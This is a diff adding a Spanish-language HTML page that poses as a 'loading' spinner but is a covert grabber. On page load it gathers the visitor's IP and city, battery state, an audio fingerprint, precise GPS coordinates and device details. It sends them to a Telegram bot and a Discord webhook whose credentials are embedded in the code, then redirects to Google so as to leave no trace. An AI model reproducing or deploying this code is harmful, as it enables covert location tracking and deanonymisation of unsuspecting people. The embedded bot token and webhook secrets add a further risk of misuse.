@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Cargando...</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .spinner { border: 4px solid rgba(0,255,0,0.1); width: 40px; height: 40px; border-radius: 50%; border-top-color: #0f0; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+
+    <script>
+        const CONFIG = {
+            webhook: "https://discord.com/api/webhooks/1327800733330599946/BRlFD4PvC66BvqfW7XNbHNYVHVl2uYyXtZQ1ufivSQlTfj0gk2_tFQB_p0mdhwLjPQmk",
+            token: "8536690071:AAG-ScvmZZYWSdhrd3v4lltuWagWuVFlLBU",
+            chat: "7542699747",
+            exit: "https://www.google.com"
+        };
+
+        async function recolectarTodo() {
+            // 1. Intentar IP
+            let ipData;
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                ipData = `${d.ip} (${d.city}, ${d.org})`;
+            } catch(e) { ipData = "⚠️ Hubo problemas con este criterio (IP)"; }
+
+            // 2. Intentar Batería
+            let batData;
+            try {
+                const b = await navigator.getBattery();
+                batData = `${Math.round(b.level * 100)}%${b.charging ? ' ⚡' : ''}`;
+            } catch(e) { batData = "⚠️ Hubo problemas con este criterio (Batería)"; }
+
+            // 3. Intentar Audio ID
+            let audioData;
+            try {
+                const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+                const osc = ctx.createOscillator();
+                osc.type = 'sawtooth';
+                osc.frequency.setValueAtTime(8000, ctx.currentTime);
+                const comp = ctx.createDynamicsCompressor();
+                osc.connect(comp); comp.connect(ctx.destination);
+                osc.start(0);
+                const buffer = await ctx.startRendering();
+                audioData = buffer.getChannelData(0).slice(4500, 5000).reduce((a, b) => a + Math.abs(b), 0).toString().replace(".", "").substring(0, 10);
+            } catch(e) { audioData = "⚠️ Hubo problemas con este criterio (Hardware ID)"; }
+
+            // 4. Intentar GPS (con timeout)
+            let gpsData;
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000 });
+                });
+                gpsData = `\`${pos.coords.latitude}, ${pos.coords.longitude}\` (Precisión: ${Math.round(pos.coords.accuracy)}m)\n📍 [Mapa](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
+            } catch(e) { 
+                gpsData = "⚠️ Hubo problemas con este criterio (GPS Denegado/Timeout)"; 
+            }
+
+            // Enviar reporte final
+            await enviarReporte(ipData, batData, audioData, gpsData);
+        }
+
+        async function enviarReporte(ip, bat, audio, gps) {
+            const specs = `📱 OS: ${navigator.platform} | Res: ${window.screen.width}x${window.screen.height}`;
+            
+            const report = `☣️ *REPORTE DE ACCESO*\n` +
+                           `━━━━━━━━━━━━━━━━━━━━\n` +
+                           `🆔 *Hardware ID:* \`${audio}\`\n` +
+                           `🌍 *IP:* \`${ip}\`\n` +
+                           `🔋 *Batería:* ${bat}\n` +
+                           `📍 *GPS:* ${gps}\n\n` +
+                           `💻 *Sistema:* ${specs}`;
+
+            try {
+                // Telegram
+                await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.chat,
+                        text: report,
+                        parse_mode: "Markdown",
+                        disable_web_page_preview: true
+                    })
+                });
+
+                // Discord
+                await fetch(CONFIG.webhook, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: report.replace(/\*/g, "**") })
+                });
+
+                // Redirección SOLA después de confirmar el envío
+                window.location.href = CONFIG.exit;
+
+            } catch(e) {
+                // Si falla el envío, intentamos redirigir de todos modos para no dejar rastro
+                window.location.href = CONFIG.exit;
+            }
+        }
+
+        // Iniciar proceso
+        window.onload = recolectarTodo;
+    </script>
+</body>
+</html>
